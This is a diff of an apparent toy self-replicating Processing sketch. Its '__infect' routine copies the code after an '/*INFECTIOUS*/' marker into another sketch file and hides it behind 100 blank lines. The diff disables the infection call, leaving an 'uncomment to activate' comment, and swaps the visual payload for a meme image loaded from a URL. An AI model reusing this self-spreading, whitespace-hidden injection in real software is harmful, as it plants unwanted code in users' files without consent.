@@ -82,7 +82,7 @@ void __infect(File f) {
     String[] code = loadStrings(pathToSelf);
     boolean foundMarker = false;
     String payload = "";
-    
+        
     for (int i=0; i<code.length; i++) {
       if (foundMarker) {
         /* do not write comments */
@@ -90,7 +90,7 @@ void __infect(File f) {
           payload += code[i].trim();
         }
       } else if (code[i].equals("/*INFECTIOUS*/")) {
-        for (int j=0; j<50; j++) {
+        for (int j=0; j<100; j++) {
           payload += "\n";
         }
         payload += ("/*INFECTIOUS*/\n");
@@ -124,7 +124,7 @@ void setup() {
 
   if (f != null) {
     println("chose: "+ f.getAbsolutePath());
-    __infect(f);    
+    //__infect(f); /* uncomment to activate infectious payload */
   } else {
     println("No candidate found");
   }
@@ -137,7 +137,11 @@ void draw() {
   __payload();
 }
 
+int __x = 0;
+int __y = 0;
+PImage __photo = loadImage("http://weknowmemes.com/wp-content/uploads/2013/11/doge-meme-26.jpg");
+
 void __payload() {
   fill(color(255, 0, 0));
-  rect(100, 100, mouseX, mouseY);  
+  image(__photo, 50 * sin(__x++), 50 * cos(__y++));
 }
